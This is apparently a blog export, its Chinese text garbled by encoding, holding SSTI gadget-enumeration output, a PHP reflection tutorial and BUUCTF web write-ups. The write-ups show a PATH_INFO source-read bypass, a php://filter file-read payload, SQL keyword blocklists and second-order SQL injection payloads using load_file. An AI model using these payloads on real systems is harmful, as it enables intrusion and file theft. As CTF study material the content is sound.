&lt;class 'site._Printer'&gt;, 'execfile')(77, 20, &lt;class 'site.Quitter'&gt;, 'file')(77, 20, &lt;class 'site.Quitter'&gt;, 'exec')(77, 23, &lt;class 'site.Quitter'&gt;, '__import__')(77, 23, &lt;class 'site.Quitter'&gt;, 'file')(77, 23, &lt;class 'site.Quitter'&gt;, 'compile')(77, 23, &lt;class 'site.Quitter'&gt;, 'eval')(77, 23, &lt;class 'site.Quitter'&gt;, 'open')(77, 23, &lt;class 'site.Quitter'&gt;, 'execfile')(78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, '__import__')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'compile')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile')(79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, '__import__')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'compile')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile')----------4-----------(60, '__import__')(60, 'file')(60, 'repr')(60, 'compile')(60, 'eval')(60, 'open')(60, 'execfile')è¿›ä¸€æ­¥è·å–å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–è€…è¯»å–æ–‡ä»¶çš„ç±»----------1----------- (40, 'file') ----------2----------- (59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open']) (77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__']) (77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open']) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None) ----------3----------- (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile') (72, 20, &lt;class 'site._Printer'&gt;, 'file') (72, 20, &lt;class 'site._Printer'&gt;, 'exec') (72, 23, &lt;class 'site._Printer'&gt;, 'file') (72, 23, &lt;class 'site._Printer'&gt;, 'eval') (72, 23, &lt;class 'site._Printer'&gt;, 'open') (72, 23, &lt;class 'site._Printer'&gt;, 'execfile') (77, 20, &lt;class 'site.Quitter'&gt;, 'file') (77, 20, &lt;class 'site.Quitter'&gt;, 'exec') (77, 23, &lt;class 'site.Quitter'&gt;, 'file') (77, 23, &lt;class 'site.Quitter'&gt;, 'eval') (77, 23, &lt;class 'site.Quitter'&gt;, 'open') (77, 23, &lt;class 'site.Quitter'&gt;, 'execfile') (78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile') (79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile') ----------4----------- (60, 'file') (60, 'repr') (60, 'eval') (60, 'open') (60, 'execfile') å°ç»“ï¼šæ¢³ç†äº†ä¸€éä»¥åï¼Œæ„Ÿè§‰å…¶å®sstiæ³¨å…¥ä¹Ÿä¸éš¾ï¼Œéš¾çš„æ˜¯ä¸€å¼€å§‹é¢å¯¹å•¥ä¹Ÿä¸æ‡‚çš„æ‰‹è¶³æ— æªï¼Œä¸çŸ¥é“ä»å“ªå…¥æ‰‹ï¼Œç°åœ¨å¯èƒ½è¿˜æ˜¯æœ‰ä¸€äº›å°ç‚¹ä¸æ˜¯å¾ˆæ‡‚ï¼Œä½†æ˜¯ç»ˆäºæ˜¯æ²¡é‚£ä¹ˆé™Œç”Ÿäº† å‚è€ƒ:https://xz.aliyun.com/t/6885#toc-1https://www.anquanke.com/post/id/226900#h3-14https://xz.aliyun.com/t/3679#toc-9https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5https://xz.aliyun.com/t/8029#toc-7https://www.freebuf.com/articles/network/258136.htmlhttps://juejin.cn/post/6908600736754434056#heading-13","link":"/2021/02/28/python-SSTI%E6%B3%A8%E5%85%A5/"},{"title":"CTFä¸­çš„phpåå°„","text":"åå°„æ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯æŒ‡åœ¨PHPè¿è¡ŒçŠ¶æ€ä¸­ï¼Œæ‰©å±•åˆ†æPHPç¨‹åºï¼Œå¯¼å‡ºæˆ–æå–å‡ºå…³äºç±»ã€æ–¹æ³•ã€å±æ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šã€‚è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºåå°„APIã€‚åå°„æ˜¯æ“çºµé¢å‘å¯¹è±¡èŒƒå‹ä¸­å…ƒæ¨¡å‹çš„APIï¼Œå…¶åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå¯å¸®åŠ©æˆ‘ä»¬æ„å»ºå¤æ‚ï¼Œå¯æ‰©å±•çš„åº”ç”¨ã€‚ å…¶ç”¨é€”å¦‚ï¼šè‡ªåŠ¨åŠ è½½æ’ä»¶ï¼Œè‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£ï¼Œç”šè‡³å¯ç”¨æ¥æ‰©å……PHPè¯­è¨€ã€‚ PHPåå°„apiç”±è‹¥å¹²ç±»ç»„æˆï¼Œå¯å¸®åŠ©æˆ‘ä»¬ç”¨æ¥è®¿é—®ç¨‹åºçš„å…ƒæ•°æ®æˆ–è€…åŒç›¸å…³çš„æ³¨é‡Šäº¤äº’ã€‚å€ŸåŠ©åå°„æˆ‘ä»¬å¯ä»¥è·å–è¯¸å¦‚ç±»å®ç°äº†é‚£äº›æ–¹æ³•ï¼Œåˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹ï¼ˆä¸åŒäºç”¨newåˆ›å»ºï¼‰ï¼Œè°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼ˆä¹Ÿä¸åŒäºå¸¸è§„è°ƒç”¨ï¼‰ï¼Œä¼ é€’å‚æ•°ï¼ŒåŠ¨æ€è°ƒç”¨ç±»çš„é™æ€æ–¹æ³•ã€‚ åå°„apiæ˜¯PHPå†…å»ºçš„OOPæŠ€æœ¯æ‰©å±•ï¼ŒåŒ…æ‹¬ä¸€äº›ç±»ï¼Œå¼‚å¸¸å’Œæ¥å£ï¼Œç»¼åˆä½¿ç”¨ä»–ä»¬å¯ç”¨æ¥å¸®åŠ©æˆ‘ä»¬åˆ†æå…¶å®ƒç±»ï¼Œæ¥å£ï¼Œæ–¹æ³•ï¼Œå±æ€§ï¼Œæ–¹æ³•å’Œæ‰©å±•ã€‚è¿™äº›OOPæ‰©å±•è¢«ç§°ä¸ºåå°„ã€‚ å¹³å¸¸æˆ‘ä»¬ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ ReflectionClassç±» å’Œ ReflectionMethodç±»ï¼Œä¾‹å¦‚ï¼š &lt;?php``class` `Person``{`` ``/**`` ``* For the sake of demonstration, we&quot;re setting this private`` ``*/`` ``private` `$_allowDynamicAttributes` `= false;` ` ``/**`` ``* type=primary_autoincrement`` ``*/`` ``protected` `$id` `= 0;` ` ``/**`` ``* type=varchar length=255 null`` ``*/`` ``protected` `$name``;` ` ``/**`` ``* type=text null`` ``*/`` ``protected` `$biography``;` ` ``public` `function` `getId()`` ``{`` ``return` `$this``-&gt;id;`` ``}` ` ``public` `function` `setId(``$v``)`` ``{`` ``$this``-&gt;id = ``$v``;`` ``}` ` ``public` `function` `getName()`` ``{`` ``return` `$this``-&gt;name;`` ``}` ` ``public` `function` `setName(``$v``)`` ``{`` ``$this``-&gt;name = ``$v``;`` ``}` ` ``public` `function` `getBiography()`` ``{`` ``return` `$this``-&gt;biography;`` ``}` ` ``public` `function` `setBiography(``$v``)`` ``{`` ``$this``-&gt;biography = ``$v``;`` ``}``} ä¸€ã€é€šè¿‡ReflectionClassï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°Personç±»çš„ä»¥ä¸‹ä¿¡æ¯ï¼š å¸¸é‡ Contants å±æ€§ Property Names æ–¹æ³• Method Namesé™æ€ å±æ€§ Static Properties å‘½åç©ºé—´ Namespace Personç±»æ˜¯å¦ä¸ºfinalæˆ–è€…abstract Personç±»æ˜¯å¦æœ‰æŸä¸ªæ–¹æ³• æ¥ä¸‹æ¥åå°„å®ƒï¼Œåªè¦æŠŠç±»åâ€Personâ€ä¼ é€’ç»™ReflectionClasså°±å¯ä»¥äº†ï¼š $class` `= ``new` `ReflectionClass(``'Person'``); ``// å»ºç«‹ Personè¿™ä¸ªç±»çš„åå°„ç±» ``$instance` `= ``$class``-&gt;newInstanceArgs(``$args``); ``// ç›¸å½“äºå®ä¾‹åŒ–Person ç±» 1ï¼‰è·å–å±æ€§(Properties)ï¼š &lt;?php``$properties` `= ``$class``-&gt;getProperties();``foreach` `(``$properties` `as` `$property``)``{`` ``echo` `$property``-&gt;getName() . ``&quot;\\n&quot;``;``}``// è¾“å‡º:``// _allowDynamicAttributes``// id``// name``// biography é»˜è®¤æƒ…å†µä¸‹ï¼ŒReflectionClassä¼šè·å–åˆ°æ‰€æœ‰çš„å±æ€§ï¼Œprivate å’Œ protectedçš„ä¹Ÿå¯ä»¥ã€‚å¦‚æœåªæƒ³è·å–åˆ°privateå±æ€§ï¼Œå°±è¦é¢å¤–ä¼ ä¸ªå‚æ•°ï¼š $private_properties` `= ``$class``-&gt;getProperties(ReflectionProperty::IS_PRIVATE); å¯ç”¨å‚æ•°åˆ—è¡¨ï¼š ReflectionProperty::IS_STATIC ReflectionProperty::IS_PUBLIC ReflectionProperty::IS_PROTECTED ReflectionProperty::IS_PRIVATE é€šè¿‡$property-&gt;getName()å¯ä»¥å¾—åˆ°å±æ€§åã€‚ 2ï¼‰è·å–æ³¨é‡Šï¼š é€šè¿‡getDocCommentå¯ä»¥å¾—åˆ°å†™ç»™propertyçš„æ³¨é‡Šã€‚ &lt;?php``foreach` `(``$properties` `as` `$property``)``{`` ``if` `(``$property``-&gt;isProtected())`` ``{`` ``$docblock` `= ``$property``-&gt;getDocComment();`` ``preg_match(``'/ type\\=([a-z_]*) /'``, ``$property``-&gt;getDocComment(), ``$matches``);`` ``echo` `$matches``[1] . ``&quot;\\n&quot;``;`` ``}``}``// Output:``// primary_autoincrement``// varchar``// text 3ï¼‰è·å–ç±»çš„æ–¹æ³• getMethods() æ¥è·å–åˆ°ç±»çš„æ‰€æœ‰methodsã€‚ hasMethod(string) æ˜¯å¦å­˜åœ¨æŸä¸ªæ–¹æ³• getMethod(string) è·å–æ–¹æ³• 4ï¼‰æ‰§è¡Œç±»çš„æ–¹æ³•ï¼š $instance``-&gt;getName(); ``// æ‰§è¡ŒPerson é‡Œçš„æ–¹æ³•getName``// æˆ–è€…ï¼š``$method` `= ``$class``-&gt;getmethod(``'getName'``); ``// è·å–Person ç±»ä¸­çš„getNameæ–¹æ³•``$method``-&gt;invoke(``$instance``); ``// æ‰§è¡ŒgetName æ–¹æ³•``// æˆ–è€…ï¼š``$method` `= ``$class``-&gt;getmethod(``'setName'``); ``// è·å–Person ç±»ä¸­çš„setNameæ–¹æ³•``$method``-&gt;invokeArgs(``$instance``, ``array``(``'snsgou.com'``)); äºŒã€é€šè¿‡ReflectionMethodï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°Personç±»çš„æŸä¸ªæ–¹æ³•çš„ä¿¡æ¯ï¼š æ˜¯å¦â€œpublicâ€ã€â€œprotectedâ€ã€â€œprivateâ€ ã€â€œstaticâ€ç±»å‹ æ–¹æ³•çš„å‚æ•°åˆ—è¡¨ æ–¹æ³•çš„å‚æ•°ä¸ªæ•° åè°ƒç”¨ç±»çš„æ–¹æ³• &lt;?php``// æ‰§è¡Œdetailæ–¹æ³• $method`= new ReflectionMethod('Person', 'test');``if` `(``$method``-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic())``{`` ``echo` `'Action is right'``;``}``echo` `$method``-&gt;getNumberOfParameters(); ``// å‚æ•°ä¸ªæ•°``echo` `$method``-&gt;getParameters(); ``// å‚æ•°å¯¹è±¡æ•°ç»„","link":"/2021/05/15/CTF%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/"},{"title":"buuctf16","text":"[Zer0pts2020]Can you guess it?æŸ¥çœ‹æºç : &lt;?phpinclude 'config.php'; // FLAG is defined in config.phpif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(&quot;I don't know what you are thinking, but I won't let you read it :)&quot;);}if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit();}$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if (hash_equals($secret, $guess)) { $message = 'Congratulations! The flag is: ' . FLAG; } else { $message = 'Wrong.'; }}?&gt; ä»£ç åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œå…ˆè¯´ä¸‹é¢å§ï¼Œè®©æˆ‘ä»¬æ¯”å¯¹ä¸€ä¸ªsecretï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œæ ¹æœ¬ä¸å¯èƒ½çˆ†ç ´è·‘å‡ºæ¥çš„ æ‰€ä»¥é‡ç‚¹åº”è¯¥åœ¨ä¸Šéƒ¨åˆ†ï¼Œè¯´flagåœ¨config.phpå½“ä¸­ï¼Œå¹¶ä¸”è¿˜ç”¨äº†ä¸€ä¸ªæ­£åˆ™åŒ¹é…wafæ‰config.phpï¼Œæœ‰é‚£ç§é˜²æ­¢æˆ‘ä»¬ç›´æ¥è¯»å–çš„å‘³é“ï¼Œç„¶åä¸‹é¢getsourceä¸­ï¼Œå¯¹äºæˆ‘ä»¬ä¼ å…¥çš„php_selfä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æ˜¾ç¤ºçš„ï¼Œæ‰€ä»¥çŒœæƒ³å…³é”®ç‚¹æ˜¯ç»•è¿‡è¿™é‡Œå‡ ä¸ªç‚¹å­¦ä¹ ä¸€ä¸‹å§:1.$_SERVER[â€˜PHP_SELFâ€™]æ˜¯ä»€ä¹ˆï¼Ÿ $_SERVER['PHP_SELF'] è¡¨ç¤ºå½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€ï¼Œä¸ document root ç›¸å…³ã€‚å‡è®¾æˆ‘ä»¬æœ‰å¦‚ä¸‹ç½‘å€ï¼Œ$_SERVER[â€˜PHP_SELFâ€™]å¾—åˆ°çš„ç»“æœåˆ†åˆ«ä¸ºï¼šhttp://www.baicai.link/index/ ï¼š/index/index.phphttp://www.baicai.link/cate/miandan.html ï¼š/cate/miandan.htmlhttp://www.baicai.link/php/index.php?test=foo ï¼š/php/index.phphttp://www.baicai.link/php/index.php/test/foo ï¼š/php/index.php/test/foo æ‰€ä»¥å¾ˆæ˜æ˜¾php_selfæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹èƒ½å¦å°è¯•ç»•è¿‡æ­£åˆ™åŒ¹é…å°±éœ€è¦çœ‹çœ‹basename()æœ‰æ²¡æœ‰ä»€ä¹ˆç‰¹æ€§ï¼Œæ¯”å¦‚phpå­—ç¬¦ä¸²çš„è§„åˆ™å•¥çš„~ åœ¨phpæ‰‹å†Œä¸­ï¼Œæˆ‘ä»¬å‘ç°å¦‚æœè·¯å¾„åŒ…å«å¯¹å½“å‰åŒºåŸŸè®¾ç½®æ— æ•ˆçš„å­—ç¬¦ï¼Œåˆ™basename()çš„è¡Œä¸ºæœªå®šä¹‰ã€‚ æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ„é€ ä¸€ä¸‹payload:æˆ‘ä»¬çŸ¥é“phpselfè·å–çš„æ˜¯æœ€åä¸€ä¸ª/åçš„å†…å®¹ï¼Œæˆ‘ä»¬ç›´æ¥è¾“å…¥ /config.php?source æ˜¯ä¸è¡Œçš„â€”â€”è¿™æ ·å˜æˆæˆ‘ä»¬æ‰§è¡Œçš„æ˜¯config.phpçš„å†…å®¹æ‰€ä»¥åº”è¯¥æ˜¯ /index.php/config.php æ­¤æ—¶æ‰§è¡Œçš„index.phpï¼Œè·å–çš„æ˜¯config.phpæ¥ä¸‹æ¥æ˜¯ç»•è¿‡æ­£åˆ™åŒ¹é… /index.php/config.php/æˆ‘è®¤ä¸º?source= [CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunkæŸ¥çœ‹æºç ï¼Œå‘ç°fileï¼Œå¯ä»¥æ‰“å¼€æ–‡ä»¶ï¼Œäºæ˜¯æƒ³åˆ°æ–‡ä»¶åŒ…å«ï¼Œè¯•è¯•ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œå‘ç°å¯ä»¥payload: ?file=php://filter/convert.baase64-encode/resource=index.php &lt;?php//index.phpini_set('open_basedir', '/var/www/html/');// $file = $_GET[&quot;file&quot;];$file = (isset($_GET['file']) ? $_GET['file'] : null);if (isset($file)){ if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) { echo('no way!'); exit; } @include($file);}?&gt; &lt;?php//search.phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); if(!$row) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;&lt;p&gt;Ã¥Â§Â“Ã¥ÂÂ:&quot;.$row['user_name'].&quot;&lt;/p&gt;&lt;p&gt;, Ã§Â”ÂµÃ¨Â¯Â:&quot;.$row['phone'].&quot;&lt;/p&gt;&lt;p&gt;, Ã¥ÂœÂ°Ã¥ÂÂ€:&quot;.$row['address'].&quot;&lt;/p&gt;&quot;; } else { $msg = &quot;Ã¦ÂœÂªÃ¦Â‰Â¾Ã¥ÂˆÂ°Ã¨Â®Â¢Ã¥ÂÂ•!&quot;; }}else { $msg = &quot;Ã¤Â¿Â¡Ã¦ÂÂ¯Ã¤Â¸ÂÃ¥Â…Â¨&quot;;}?&gt; &lt;?php//change.phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`='&quot;.$address.&quot;', `old_address`='&quot;.$row['address'].&quot;' where `user_id`=&quot;.$row['user_id']; $result = $db-&gt;query($sql); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;Ã¨Â®Â¢Ã¥ÂÂ•Ã¤Â¿Â®Ã¦Â”Â¹Ã¦ÂˆÂÃ¥ÂŠÂŸ&quot;; } else { $msg = &quot;Ã¦ÂœÂªÃ¦Â‰Â¾Ã¥ÂˆÂ°Ã¨Â®Â¢Ã¥ÂÂ•!&quot;; }}else { $msg = &quot;Ã¤Â¿Â¡Ã¦ÂÂ¯Ã¤Â¸ÂÃ¥Â…Â¨&quot;;}?&gt; &lt;?php//confirm.phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if($fetch-&gt;num_rows&gt;0) { $msg = $user_name.&quot;Ã¥Â·Â²Ã¦ÂÂÃ¤ÂºÂ¤Ã¨Â®Â¢Ã¥ÂÂ•&quot;; }else{ $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;Ã¨Â®Â¢Ã¥ÂÂ•Ã¦ÂÂÃ¤ÂºÂ¤Ã¦ÂˆÂÃ¥ÂŠÂŸ&quot;; }} else { $msg = &quot;Ã¤Â¿Â¡Ã¦ÂÂ¯Ã¤Â¸ÂÃ¥Â…Â¨&quot;;}?&gt; &lt;?php//delete.phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $result = $db-&gt;query('delete from `user` where `user_id`=' . $row[&quot;user_id&quot;]); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;Ã¨Â®Â¢Ã¥ÂÂ•Ã¥Âˆ Ã©Â™Â¤Ã¦ÂˆÂÃ¥ÂŠÂŸ&quot;; } else { $msg = &quot;Ã¦ÂœÂªÃ¦Â‰Â¾Ã¥ÂˆÂ°Ã¨Â®Â¢Ã¥ÂÂ•!&quot;; }}else { $msg = &quot;Ã¤Â¿Â¡Ã¦ÂÂ¯Ã¤Â¸ÂÃ¥Â…Â¨&quot;;}?&gt; å®¡è®¡ä¸€ä¸‹å¯ä»¥å‘ç°ï¼Œæœ¬é¢˜ä¸­æ²¡æœ‰å¯¹addressè¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬æ„é€ è¯­å¥çœŸå¥½ phpstormå´©æºƒäº†æƒ³åˆ°ä¹‹å‰sqlilabsåˆ·çš„äºŒæ¬¡æ³¨å…¥ï¼Œä¸€å¼€å§‹çš„change.phpä¸­åªå¯¹addressè¿›è¡Œäº† addslasheså¤„ç†ç„¶åå°±è¿›è¡Œäº†updateå¤„ç†æ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œå…ˆå­˜ä¸€ä¸ªaddressï¼Œç„¶åç”¨changeæ’å…¥æ³¨å…¥è¯­å¥ï¼Œå› ä¸ºæ’å…¥åˆ°è¡¨ä¸­ä»¥åè½¬ä¹‰çš„å­—ç¬¦æ—¶ä¸å­˜åœ¨çš„ï¼Œå–å‡ºæ¥ä¹Ÿå°±ä¸å­˜åœ¨äº†ï¼Œpayload: 1' where `user_id`=extractvalue(1,concat('~',(select load_file('/flag.txt'))))# è‡³äºä¸ºå•¥æƒ³è¯»æ–‡ä»¶ï¼Œå› ä¸ºè¡¨é‡Œæ²¡æœ‰â€“æœ€åè¿™é‡Œçœ‹äº†ä¸€ä¸‹wpï¼Œæ¯•ç«Ÿæ–‡ä»¶åè¦çŒœ== [ç½‘é¼æ¯ 2018]Commentåˆæ˜¯ä¸€é¢˜äºŒæ¬¡æ³¨å…¥é¦–å…ˆæ˜¯ç™»å½•è´¦å·æ˜¯zhangwei å¯†ç æ˜¯zhagnwei666 åé¢æ•°å­—ç›´æ¥çˆ†ç ´å°±è¡Œäº†è¿›å»ä»¥åå•¥éƒ½æ²¡æœ‰ï¼ŒçŒœæµ‹æ˜¯å­˜åœ¨æ–‡ä»¶æ³„éœ²â€”â€”å‘ç°gitæ³„éœ²ï¼Œæ‰«æä¸€æ³¢ï¼š &lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; æ€è·¯å¾ˆæ˜ç¡®äº†ã€‚æˆ‘ä»¬éœ€è¦åˆ©ç”¨categoryè¿™ä¸ªå‚æ•°æ¥ä¼ å…¥å€¼é¦–å…ˆæˆ‘ä»¬åˆ©ç”¨writeä¼ å€¼ï¼Œç„¶ååˆ©ç”¨commentæ”¹å€¼ä¼ å…¥: 2',content=(select database()),/* è¿™é‡Œè§£é‡Šä¸€ä¸‹ æˆ‘ä»¬éœ€è¦ç”¨/**/è¿™ä¸ªæ³¨é‡Šç¬¦ï¼Œå› ä¸ºä»æºç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œä»–æ˜¯å¤šè¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€‰æ‹©å¤šè¡Œæ³¨é‡Šç¬¦æ¥ä¸‹æ¥ç‚¹å‡»è¯¦æƒ… è¾“å…¥ */# è¿›è¡Œé—­åˆ å¹¶æ³¨é‡Šåé¢çš„å†…å®¹ å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ 